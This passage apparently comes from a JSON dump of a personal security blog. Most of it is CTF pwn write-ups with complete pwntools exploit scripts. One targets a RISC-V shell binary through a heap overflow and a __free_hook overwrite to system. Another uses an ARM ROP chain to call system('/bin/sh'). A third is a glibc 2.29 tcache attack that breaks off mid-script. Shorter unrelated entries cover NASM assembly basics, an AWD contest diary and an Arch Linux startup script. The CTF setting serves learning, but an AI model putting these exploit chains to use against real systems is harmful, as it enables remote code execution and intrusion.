9999# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def touch(n):\tsla(&#x27;$&#x27;, b&#x27;touch &#x27; + n)def rm(n):\tsla(&#x27;$&#x27;, b&#x27;rm &#x27; + n)def ls():\tsla(&#x27;$&#x27;, &#x27;ls&#x27;)def cat(n):\tsla(&#x27;$&#x27;, &#x27;cat &#x27; + n)def echo(t, n, d):\tsla(&#x27;$&#x27;, &#x27;echo &#x27; + t + &#x27; &#x27; + n)\ts(d)def quit():\tsla(&#x27;$&#x27;, &#x27;exit&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t# leak libc\tfor i in range(9):\t\ttouch(str(i).encode())\t\tfor i in range(8):\t\trm(str(7 - i).encode())\tfor i in range(7):\t\ttouch(str(i).encode())\ttouch(b&#x27;7&#x27;)\techo(&#x27;&gt;&gt;&#x27;, &#x27;7&#x27;, &#x27;A&#x27; * 7 + &#x27;&amp;&#x27;)\tcat(&#x27;7&#x27;)\tru(&#x27;&amp;&#x27;)\tleak = u64(r(3).ljust(8 , b&#x27;\\x00&#x27;))\tlibc_base = 0x0000004000000000 + leak - libc.sym[&#x27;__malloc_hook&#x27;] - 88 - 0x10\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\ttouch(b&#x27;debug&#x27;)\tcsu_c = 0x0001181a\tcsu_i = 0x0001182c\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tbin_sh = libc_base + 0xed4b0\tli(&#x27;system: &#x27; + hex(system))\tp = b&#x27;\\x00&#x27; * 0x138\t#p += p64(system)\t#p += p64(bin_sh)\t# modify a0 arg\tp += p64(csu_i)\tp += p64(0) # null\tp += p64(8) # s5 -&gt; a2\tp += p64(elf.got[&#x27;read&#x27;] + 8) # s4 -&gt; a1\tp += p64(0) # s3 -&gt; a0\tp += p64(1) # s2 -&gt; bypass jump\tp += p64(0) # s1 -&gt; bypass jump\tp += p64(elf.got[&#x27;read&#x27;]) # s0 -&gt; call\tp += p64(csu_c)\tp += p64(0)\t#p += p64(0)\tp += p64(1) # s5 -&gt; a2\tp += p64(2) # s4 -&gt; a1\tp += p64(bin_sh) # s3 -&gt; a0\tp += p64(1) # s2 -&gt; bypass jump\tp += p64(0) # s1 -&gt; bypass jump\tp += p64(elf.got[&#x27;read&#x27;] + 8) # call our func\tp += p64(csu_c)\techo(&#x27;&gt;&#x27;, &#x27;9&#x27;, p)\ts(p64(system))def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(&#x27;./harmoshell&#x27;)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\t#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\telse:\t\t\tio = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\t#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\telse:\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\nshell2checksecArch:     em_riscv-64-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX disabledPIE:      No PIE (0x10000)RWX:      Has RWX segments\n\n\n\nvulvoid echo(longlong param_1)&#123;  longlong lVar1;  int iVar2;  ssize_t sVar3;  undefined4 extraout_var;  undefined4 extraout_var_00;  size_t __nbytes;  char *__s1;  undefined8 uVar4;  undefined auStack288 [256];    lVar1 = *(longlong *)(param_1 + 8);  __s1 = *(char **)(lVar1 + 8);  iVar2 = strcmp(__s1,&quot;&gt;&quot;);  if (CONCAT44(extraout_var,iVar2) == 0) &#123;    uVar4 = 0;  &#125;  else &#123;    iVar2 = strcmp(__s1,&quot;&gt;&gt;&quot;);    uVar4 = 1;    if (CONCAT44(extraout_var_00,iVar2) != 0) &#123;                    /* WARNING: Subroutine does not return*/      FUN_000113ee();    &#125;  &#125;  lVar1 = FUN_000110bc(*(undefined8 *)(lVar1 +0x10));  __nbytes = 0x100;  if (-1 &lt; lVar1) &#123;    __nbytes = *(size_t *)(*(longlong*)(&amp;gp0xfffffffffffffa60 + lVar1 * 8) + 0x18);  &#125;  sVar3 = read(0,auStack288,__nbytes);  FUN_00011384(*(undefined8 *)(*(longlong*)(param_1 + 8) +0x10),auStack288,(longlong)sVar3,uVar4);  return;&#125;\n\nThe vulnerability is heap overflow. we can use echo &gt;&gt; nmae to realize it\ngdb script#! /bin/shgdb-multiarch --nh \\        -ex &quot;add-symbol-file ./harmoshell2&quot; \\        -ex &quot;set architecture riscv:rv64&quot; \\        -ex &quot;target remote 127.0.0.1:1234&quot;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./harmoshell2&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;libs/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;121.36.192.114&quot;server_port = 9999# if local debugLOCAL = 1LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def touch(n):\tsla(&#x27;$&#x27;, b&#x27;touch &#x27; + n)def rm(n):\tsla(&#x27;$&#x27;, b&#x27;rm &#x27; + n)def ls():\tsla(&#x27;$&#x27;, &#x27;ls&#x27;)def cat(n):\tsla(&#x27;$&#x27;, &#x27;cat &#x27; + n)def echo(t, n, d):\tsla(&#x27;$&#x27;, &#x27;echo &#x27; + t + &#x27; &#x27; + n)\ts(d)def quit():\tsla(&#x27;$&#x27;, &#x27;exit&#x27;)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\t# leak libc\tfor i in range(9):\t\ttouch(str(i).encode())\t\tfor i in range(8):\t\trm(str(7 - i).encode())\tfor i in range(7):\t\ttouch(str(i).encode())\ttouch(b&#x27;7&#x27;)\techo(&#x27;&gt;&gt;&#x27;, &#x27;7&#x27;, &#x27;A&#x27; * 7 + &#x27;&amp;&#x27;)\tcat(&#x27;7&#x27;)\tru(&#x27;&amp;&#x27;)\tleak = u64(r(3).ljust(8 , b&#x27;\\x00&#x27;))\tlibc_base = 0x0000004000000000 + leak - libc.sym[&#x27;__malloc_hook&#x27;] - 88 - 0x10\tli(&#x27;leak: &#x27; + hex(leak))\tli(&#x27;libc_base: &#x27; + hex(libc_base))\ttouch(b&#x27;debug&#x27;)\tcsu_c = 0x0001181a\tcsu_i = 0x0001182c\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tbin_sh = libc_base + 0xed4b0\tfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]\tli(&#x27;system: &#x27; + hex(system))\t#rm(b&#x27;8&#x27;)\ttouch(b&#x27;a&#x27;)\ttouch(b&#x27;b&#x27;)\techo(&#x27;&gt;&#x27;, &#x27;a&#x27;, &#x27;/bin/sh\\x00&#x27;.ljust(0x100, &#x27;\\x00&#x27;))\t#echo(&#x27;&gt;&#x27;, &#x27;b&#x27;, &#x27;B&#x27; * 0x100)\tp = p64(0) + p64(0x31)\tp += b&#x27;b&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)\tp += p64(free_hook) + p64(0x100)\techo(&#x27;&gt;&gt;&#x27;, &#x27;a&#x27;,  p) # heap overflow\tli(&#x27;__free_hook: &#x27; + hex(free_hook))\techo(&#x27;&gt;&#x27;, &#x27;b&#x27;, p64(system))\trm(b&#x27;a&#x27;)\t#touch(b&#x27;debug&#x27;)def finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\t#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\telse:\t\t\tio = process([&#x27;./qemu-riscv64&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\t\t\t#io = process([&#x27;./qemu-riscv64&#x27;, &#x27;-g&#x27;, &#x27;1234&#x27;, &#x27;-L&#x27; , &#x27;./libs&#x27;, elf_path])\telse:\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n\n\npwnitchecksecArch:     arm-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x10000)\n\nvulint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[260]; // [sp+0h] [bp-104h] BYREF  setvbuf((FILE *)stdout, 0, 2, 0);  printf(&quot;input: &quot;);  read(0, buf, 0x300u);  return 0;&#125;\n\nIt’s easy to found the vul. use arm gadget to exploit it! so we must leak libc before modify something\nUse print print.got table to leak\nmain = 0x000104A0#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP &#123;R11,PC&#125;gadget_1 = 0x00010348 # pop &#123;r3, pc&#125;gadget_2 = 0x000104D8 # printfgadget_3 = 0x00010500 # pop &#123;R11,PC&#125;gadget_4 = 0x000104F8p = b&#x27;A&#x27; * 0x104p += p32(gadget_1)p += p32(elf.got[&#x27;printf&#x27;])p += p32(gadget_3)p += p32(1) # r11#p += p32(elf.plt[&#x27;printf&#x27;])p += p32(gadget_2)#li(&#x27;ru&#x27;)sla(&#x27;input:&#x27;, p)\n\nSo we can leak libc address, but we found that the address not change by every attack, so the aslr protector is off\nNext attack, we just use modifying r0 regiseter gadget in libc to create a system(“&#x2F;bin&#x2F;sh”) rop chain to get shell\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0ganfrom pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;./bin&#x27;#libc_path = &#x27;/glibc/2.23/64/lib/libc.so.6&#x27;libc_path = &#x27;./libc-2.31.so&#x27;# remote server ip and portserver_ip = &quot;139.159.210.220&quot;server_port = 9999# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tmain = 0x000104A0\t#gadget_2 = 0x000104F8 #  MOV R0, R3;SUB SP, R11, #4; POP &#123;R11,PC&#125;\tgadget_1 = 0x00010348 # pop &#123;r3, pc&#125;\tgadget_2 = 0x000104D8 # printf\tgadget_3 = 0x00010500 # pop &#123;R11,PC&#125;\tgadget_4 = 0x000104F8\tlibc_base = 0xff6db39c - libc.sym[&#x27;printf&#x27;]\tsystem = libc_base + libc.sym[&#x27;system&#x27;]\tbin_sh = libc_base + 0xfe861\tgadget = libc_base + 0x0006beec # pop &#123;r0, r4, pc&#125;\tli(&#x27;libc_base: &#x27; + hex(libc_base))\tbss = 0x00020F08\t&#x27;&#x27;&#x27;\t# leak\tp = b&#x27;A&#x27; * 0x104\tp += p32(gadget_1)\tp += p32(elf.got[&#x27;printf&#x27;])\tp += p32(gadget_3)\tp += p32(1) # r11\t#p += p32(elf.plt[&#x27;printf&#x27;])\tp += p32(gadget_2)\t#li(&#x27;ru&#x27;)\tsla(&#x27;input:&#x27;, p)\t&#x27;&#x27;&#x27;\tp = b&#x27;A&#x27; * 0x100\tp += p32(bss + 0x100) # r11\tp += p32(gadget)\tp += p32(bin_sh)\tp += p32(bin_sh)\tp += p32(system)\tsla(&#x27;input:&#x27;, p)\tdef finish():\tia()\tc()#--------------------------main-----------------------------if __name__ == &#x27;__main__&#x27;:\tif LOCAL:\t\telf = ELF(elf_path)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\t\t\tio = elf.process(env = &#123;&quot;LD_PRELOAD&quot; : libc_path&#125; )\t\telse:\t\t\tio = elf.process()\telse:\t\telf = ELF(elf_path)\t\tio = remote(server_ip, server_port)\t\tif LIBC:\t\t\tlibc = ELF(libc_path)\texploit()\tfinish()\n\n","categories":["ctf"],"tags":["pwn"]},{"title":"x86_64 asm","url":"/2020/12/16/dev/language/asm/x86_64/nasm/","content":"NASMHello world; This is a very simple program; Hello World Program; Complie: nasm -f elf p1.asm; Link   : ld -m elf_i386 p1.o -o p1SECTION.data\tmsg db &quot;Hello World&quot;, 0Ah, 00h ; Crete a string, the 0Ah is a &#x27;\\n&#x27; SECTION.textglobal _start_start:\tmov edx, 13 ; the length of string\tmov ecx,msg ; string address\tmov ebx,1   ; write this to standard io output\tmov eax,4   ; SYS_write\tint 80h     ; syscall\tmov ebx,0 ; return value\tmov eax,1 ; SYS_exit\tint 80h   ; syscall\n\n\n\n自动计算字符串长度; This program also is Hello Wrold, but it is auto calc the length of string.data\tmsg db &#x27;Hello Wrold&#x27;, 0ah, 00h ;\t.textglobal _start_start:\tmov ebx,msg ; move address of string in ebx register\tmov eax,ebx ; get address;A loop to get length of stringnextchar:\tcmp byte[eax], 0\tjz finished ; if eax equle to 0, then break\tinc eax ; eax increse 1\tjmp nextchar ; continue loopfinished:\tsub eax, ebx ; eax = eax - ebx, get length\tmov edx, eax ; length\tmov ecx, msg ; address of string\tmov ebx, 1   ; print to standard io output\tmov eax, 4   ; SYS_write\tint 80h      ; syscall\tmov ebx, 0   ; return value\tmov eax, 1   ; sys_exit\tint 80h      ; syscall\n\n手动计算字符串长度; This program also is Hello Wrold, but it is auto calc the length of string; It will take strlen function to calc length of string.data\tmsg db &#x27;Hello Wrold&#x27;, 0ah, 00h ;\t.textglobal _start_start:\tmov ebx,msg ; move address of string in ebx register\tcall strlen ;\tmov edx, eax ; length\tmov ecx, msg ; address of string\tmov ebx, 1   ; print to standard io output\tmov eax, 4   ; SYS_write\tint 80h      ; syscall\tmov ebx, 0   ; return value\tmov eax, 1   ; sys_exit\tint 80h      ; syscall\t; calc length of string functionstrlen:\tmov eax, 0;A loop to get length of stringnextchar:\tcmp byte[ebx + eax], 0\tjz finished ; if eax equle to 0, then break\tinc eax ; eax increse 1\tjmp nextchar ; continue loopfinished:\tret          ; return\n\n\n\n分离式编译和C语言一样，汇编程序也是可以进行分离式编译的，你可以把自己的函数写到一个文件里，而另一的文件把它包含进去，然后就可以调用它。\n头文件代码;-------------------Hello World Program(include)--------------------; 函数头文件; by alongwy;-------------------------------------------------------------------;------------------------------------------; int slen(String message); 计算字符串的长度slen:    push    ebx    mov     ebx, eaxnextchar:    cmp     byte [eax], 0    jz      finished    inc     eax    jmp     nextcharfinished:    sub     eax, ebx    pop     ebx    ret;------------------------------------------; void sprint(String message); 打印字符串sprint:    push    edx    push    ecx    push    ebx    push    eax    call    slen            ;调用slen计算字符串长度    mov     edx, eax    pop     eax    mov     ecx, eax    mov     ebx, 1    mov     eax, 4    int     80h    pop     ebx    pop     ecx    pop     edx    ret;------------------------------------------; void exit(); 退出程序quit:    mov     ebx, 0    mov     eax, 1    int     80h    ret\n\n主文件;-------------------Hello World Program(include)--------------------; by alongwy; 编译： nasm -f elf helloworld-inc.asm; 链接： ld -m elf_i386 helloworld-inc.o -o helloworld-inc;        64位系统需要 elf_i386 选项; 运行： ./helloworld-inc;-------------------------------------------------------------------%include    &#x27;functions.asm&#x27;              ; 包含头文件SECTION .data                            ; 数据段    msg1    db  &#x27;Hello World!&#x27;, 0Ah, 0h  ; 创建字符串，0Ah是换行符    msg2    db  &#x27;Hello NASM!&#x27;, 0Ah, 0h   ; 后面添加了一个0    SECTION .text                            ; 代码段global  _start_start:    mov     eax, msg1           ; 存入mag1的地址    call    sprint              ; 调用sprint打印    mov     eax, msg1    call    sprint    call    exit                ; 退出\n","categories":["language"],"tags":["asm"]},{"title":"Some small records of the I-SOON Cup Of CUIT CTF Competition final","url":"/2020/12/06/security/ctf/pwn/axb2020/","content":"Some small records of the I-SOON Cup Of CUIT CTF Competition final\nThe 2020 i-soon cup finals have been successfully held. D0g3’s every member have worked hard. This competition feels great. After all, I have experienced a lot and learned a lot. My experience of this competition is as follows.\nD0g3’s internal self-developed awd platform without documentation, various error reports emerge in an endless stream. After a week of tossing about the platform construction and test challenges, We have basically been tested on ourself’s servers. The day before the competition, everyone was happily coming to the i-soon company. When we came to i-soon company, They asked us directly what virtual machine mirror we wanna give. We were a little bit confused about that. What we need is a server. We need to build the d0g3’s awd platform  on their server, Then the i-soon company took two or three hours to configure a server that to give us. We started to have communication problems with each other. We didn’t know what each other’s needs were and what tasks we to do. Later we knew that i-soon had their internal competition platform,  we don’t know anything about the ctf platform. After we got to the server, because I forgot to take network cable changer, I set a intranet expose on another intranet’s computer, so that public network can connect to the intranet server. It’s been a half of day for building our awd platform on their server.  When we prepared the test challenges and compiled the docker image. The result was that the container failed to start the  docker container. That’s too bad! It never happened to us. We searched on the google and to asked every master, they don’t know what error it was. After a few hours of tossing, everyone had crashed.  Everyone didn’t know what was going on. It was dark. i-soon operation and maintenance manager told us that “If there is no way to fix it,you build a VMware virtual machine image, then I can import this image to our VMware as a server”. Everyone was exhausted, but we were still working on it. We started to build the platform from 0 to 1. After the building our platform on our virtual machine was completed, All challenges can compiled.  No any error. \nCome today, it is equivalent to do nothing. Long brother who penetrated from the intranet can’t rebound the shell in i-soon’s network, The day was wasted, And the i-soon’s member said that they will hold the ctf  competition the next day, only can test challenges In the next evening . Oh shit! We deal with them for a long time on small problems, let alone tomorrow test. . . Everyone went back to school dingy at night.\nCame to i-soon at 5 pm the next day, I wrote a batch management script for docker container , and began to rewrite the interface corresponding to their database, and also needed to map the team name and debug this. It basically took half an hour to return the results of an interface, They also had a problem there, and they kept adjusting. It was about 10 o’clock in the evening before they successfully tested an interface for generating and submitting flags. Later, It began to work on their platform. But we compiled challenge did not generate flags. Because the flag generation mechanism was running in the container, and some Python libraries are required to use their interface, we need to modify the dockerfile and recompile the image for this problem,  then we also found that it can’t start flag.py, and got a original container name not a real team name. I have to split the string to get the team name. At 12 o’clock in the evening, the first pwn challenge was tested, the first flag was submitted, and then the checking mechanism interface was written. But the checking mechanism interface over there is wrong, I also debugged it for a long time. After I adjusted it and i-soon adjusted it, I tested one and called this interface. It’ was ok, The test is no any problem, I continued to test pwn2 challenge. The pwn2 challenge was still smooth. It has been more than am 1 o’clock and the rules of the ctf are still not written. We have to continue to test our challenges, and they also can’t wait it anymore, because currently there are only two pwns that can submit the flag to get through, they felt nothing to do then back home to sleep. We just tested penetration and pwn , but everyone did not give up and continued to test the web challenges. It was too slow to pull the mirror image and update the source for building web docker image, I found that there was also a problem with the DNS. After using the default apt source and modifying the DNS, pull The mirror image is much faster. After 2 am, the php challenge is OK. Everyone also wrote down and wrote the corresponding check mechanism. Continue to test java challenge. There are many java error, the spring boot cannot be started. We have to change the source code. Master Cheng They got it with Master Liu and they did it for a long time. . . It’s hard work. There is also a proxy code in the check mechanism code that was not deleted, which caused every check to fail! At 4 o’clock, I went to bed first, while the other masters continued to modify the web challenges.\nIn the morning, I put the check mechanism of each challenge under unified operation management. Basically there is no problem. We started all the questions to test whether each challenge can be solved. Basically all the challenge are accessible. The python problem is solved. But there is still a problem. The other masters did not succeed until two hours before the start of the ctf awd mode. The Intranet Penetration mode was released at 9 in the morning,  and AWD mode was opened at 12:30 noon. We did not do a stress test and tested each team account one by one on the platform. Just hope it ok!  At 10 o’clock, the container was first generated, and then each team’s account was registered. The port and ssh also have passwords. They were distributed by Master Chen to one of the team members at 12:25. When the awd mode was turned on at 12:30, I started to check mechanism service. At the beginning, each player went crazy on php waf, and then kept going After being checked, some people started to patch pwn1, and then some people started to be checked in pwn1, python, and java, and pwn2 also checked in the end. Every time you check, I have to cut a screenshot in my laptop send to QQ group to notify all people, which is not very convenient. Fortunately, Mr. Xiao and the others have a QQ robot push interface, Just modify the check script, then push the result of check message of each challenge to the QQ group in a turn. Some teams uploaded modfied pwn1 binary files deleted immediately by other teams, and there are also some through the nc rebound shell. . . Every time a batch attack or batch check, everyone will booze and nervous. The atmosphere of the ctf  competition is very energetic,  I won’t go into details here. Today’s ctf is very satisfied\nBack school after eating hot pot.  A nice experience for me! \n","categories":["ctf"],"tags":["record"]},{"title":"archlinux设置自己的开机脚本","url":"/2020/11/28/env/linux/myarch/set_startup_script/","content":"Archlinux 设置自己的开机脚本以下命令以root用户执行 1.创建一个启动service脚本\nvim /etc/systemd/system/rc-local.service\n\n\n[Unit]Description=&quot;/etc/rc.local Compatibility&quot; [Service]Type=oneshotExecStart=/etc/rc.local startTimeoutSec=0StandardInput=ttyRemainAfterExit=yesSysVStartPriority=99[Install]WantedBy=multi-user.target\n\n2.创建 &#x2F;etc&#x2F;rc.local 文件\nvim /etc/rc.local\n\n\n#!/bin/sh# /etc/rc.localif test -d /etc/rc.local.d; then    for rcscript in /etc/rc.local.d/*.sh; do        test -r &quot;$&#123;rcscript&#125;&quot; &amp;&amp; sh $&#123;rcscript&#125;    done    unset rcscriptfi\n\n3.添加执行权限\nchmod a+x /etc/rc.local\n\n4.添加&#x2F;etc&#x2F;rc.local.d文件夹\nmkdir /etc/rc.local.d\n\n5.设置开机自启\nsystemctl enable rc-local.service\n\n sh脚本放在/etc/rc.local.d/里面就可以了 \n下面是我放置的开机自启动脚本 &#x2F;etc&#x2F;rc.local.d&#x2F;init.sh\n#! /bin/bash#  Author: I0ganrmmod pcspkr # remove pcspkr moudlefiglet &quot;Arch Linux Y9000P 3070Ti Owned By I0gan&quot;xbacklight 60mount -o remount,rw,exec /dev/nvme1n1p6#mount -o remount,rw,exec /dev/nvme0n1p1su - i0gan -c &quot;nohup /usr/bin/clash &gt;/dev/null &amp;&quot; \n\n","categories":["env"],"tags":["linux"]},{"title":"2020祥云杯 Pwn WP","url":"/2020/11/24/security/ctf/compitation/wp-xyb-2020/","content":"祥云杯 2020 WP前言这次比赛打得不是很好，第一个题从比赛开始一直做，做到下午5点还没做出来，只好看其他pwn了，拿到可以实现修改rip了，但是打所有one_gadget都失败，打到一个，不能输入命令执行，只好去看我接的那个项目了，当天就是截至日期，我的项目里还存在几个错误，对方一直在催，我只好再改改项目中的代码，但是还是不会写测试代码，不知道那边测试机制是啥。。。然后又继续干pwn了，在libc中一直找gadget想来控制一下rdi寄存器，并且调用system函数，setcontext中的gadget可以实现，但是开辟的堆太小了，没法使用该gadget，我只好再找找其他的gadget，找到一个可以修改rsp寄存器的gadget，我采用该gadget来打one_gadget，想不到还通了。。。晚上10点第一个pwn，后面心情爽多了，晚上11点又干出到影流之主，该题听说是个cve，熬夜继续干，先是看了把嘴闭上，实在没思路，有继续看第一个pwn了，换了另一种思路，凌晨3点出了这道。接下来只剩下内核pwn和一个没头绪的把嘴闭上了，我就没看了，一觉睡到9点，听说上了道pwn，匆忙的从寝室去实验室，不到半小时把这新上的题做了。又开始看内核pwn和把嘴闭上，自己毛病犯了，一点小事把自己搞得跟颓废的狗，就没继续打比赛了，这里就不说了，对不住了各位师傅，望见谅！离比赛结束还有两个多小时，看着队伍名次掉到30后了，自己也坐不住了，继续打pwn，听另一位师傅说该体是一个cve，给了个该bug的报告网站，我看了下，可以利用该漏洞来修改top chunk，但是bug提交者提供的poc感觉只是对堆的top chunk 该往下边去了，没发现啥，但是在poc中两次调用mallopt的中间加一个malloc(0x1f)，可以实现吧top chunk 指向main_arena + 88处，也就可以在下次分配的时候分配到main_arena + 0x88处，本来想修改top chunk实现任意地址开辟，但是不能自定义修改top chunk指针，后面又想覆写_IO_2_1_stout_结构体，伪造虚表，发现好多main_arena中的值都不能修改，一直卡死，直到比赛结束，灰溜溜的就回寝室睡觉了。。。\n这次比赛总排名19，学到了不少东西，各位师傅辛苦了，尤其是web，misc，crypto，re，表现都很不错，给个赞！！！ d0g3起飞～～\nPWN1 [Beauty_Of_ChangChun]该题是glibc2.29以上的利用，若开辟大小大于或等于0x100会存在个uaf漏洞，且开辟大小存在范围的，且采用calloc开辟，没法直接利用uaf漏洞来修改tcache bin的fd实现劫持，后面就想采用unsorted bin attack楼改global_max_fast为一个大值，这样就可以采用fastbin attack攻击手段，在我使用unsorted bin attack的时候总是失败，网上一搜，原来glibc2.29以上unsorted bin attack基本已经失效，后面了解到small bin可以代替unsorted bin attack，也了解到glibc.2.29以上一种攻击Tcache Stashing Unlink Attack可以实现任意地址开辟或者unsorted bin attack效果。就学习该手段，一心只想修改global_max_fast后采用fastbin attack，calloc(1, 0x100)次数只能使用3次，有就放弃了该念头，然后想采用Tcache Stashing Unlink Attack来实现任意地址开辟，也搞了半天，tcache bin已经满了，也不能采用其他的大小的small bin，采用unsorted bin 分割搞了半天，还是实现不了其他大小small bin连续两个堆块的连接，后面就做项目去了。。。凌晨过来继续看，我将目光指向了打印flag函数的检查机制，若我能够修改程序初始化的key值，然后再在某个堆中填写我们修改的key值，绕过检查即可打印flag，修改mmap中的随机数key值就采用Tcache Stashing Unlink Attack来修改为main_arena附近的地址，类似与unsorted bin attack，在堆中存放计算好的main_arena附近地址就行，绕过之后就可打印flag。\nvulunsigned __int64 del()&#123;  unsigned int v1; // [rsp+4h] [rbp-1Ch]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;idx:&quot;);  v1 = inputn();  if ( v1 &lt;= 9 &amp;&amp; p_size[v1] )  &#123;    free((void *)p_arr[v1]);    LOBYTE(p_size[v1]) = 0;                     // vul  &#125;  return __readfsqword(0x28u) ^ v2;&#125;\n\n\n\nexp#!/usr/bin/env python#-*- coding:utf-8 -*-# Author: i0gan# Env: Linux arch 5.8.14-arch1-1from pwn import *import osr   =  lambda x : io.recv(x)ra  =  lambda   : io.recvall()rl  =  lambda   : io.recvline(keepends = True)ru  =  lambda x : io.recvuntil(x, drop = True)s   =  lambda x : io.send(x)sl  =  lambda x : io.sendline(x)sa  =  lambda x, y : io.sendafter(x, y)sla =  lambda x, y : io.sendlineafter(x, y)ia  =  lambda : io.interactive()c   =  lambda : io.close()li    = lambda x : log.info(&#x27;\\x1b[01;38;5;214m&#x27; + x + &#x27;\\x1b[0m&#x27;)context.log_level=&#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]elf_path  = &#x27;pwn&#x27;libc_path = &#x27;/glibc/2.29/64/lib/libc.so.6&#x27;# remote server ip and portserver_ip = &quot;112.126.71.170&quot;server_port = 43652# if local debugLOCAL = 0LIBC  = 1#--------------------------func-----------------------------def db():\tif(LOCAL):\t\tgdb.attach(io)def ad(sz):\tsla(&#x27;scenery\\n&#x27;, &#x27;1&#x27;)\tsla(&#x27;size:&#x27;, str(sz))def rm(i):\tsla(&#x27;scenery\\n&#x27;, &#x27;2&#x27;)\tsla(&#x27;:&#x27;, str(i))def md(i, d):\tsla(&#x27;scenery\\n&#x27;, &#x27;3&#x27;)\tsla(&#x27;:&#x27;, str(i))\tsla(&#x27;:&#x27;, d)def dp(i):\tsla(&#x27;scenery\\n&#x27;, &#x27;4&#x27;)\tsla(&#x27;:&#x27;, str(i))def ad2(d):\tsla(&#x27;scenery\\n&#x27;, &#x27;5&#x27;)\ts(d)\tdef ad3():\tsla(&#x27;scenery\\n&#x27;, &#x27;666&#x27;)# glibc 2.29 ~ 2.32#--------------------------exploit--------------------------def exploit():\tli(&#x27;exploit...&#x27;)\tru(&#x27;ple\\n&#x27;)\tflag_addr = int(r(12),16)\tli(&#x27;flag_addr: &#x27; + hex(flag_addr))\tad(0x100)\tad(0x80)  # 1 avoid unsorted bin merge\trm(1)\tad(0x100) # 1\tad(0x80)  # 2 avoid top chunk merge, and use for small bin\trm(0)\tfor _ in range(6):\t\tmd(0, p64(0) + p64(0))\t\trm(0)\tdp(0)\tleak = u64(ru(&#x27;\\x0a\\x48&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))\theap = leak - 0x260\tli(&#x27;heap: &#x27; + hex(heap))\tmd(0, p64(0) + p64(0))\trm(0)\tdp(0)\tleak = u64(ru(&#x27;\\x7f&#x27;)[-5:] + b&#x27;\\x7f\\x00\\x00&#x27;)\tmalloc_hook = leak - 96 - 0x10\tlibc_base = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]\tglobal_max_fast = libc_base + 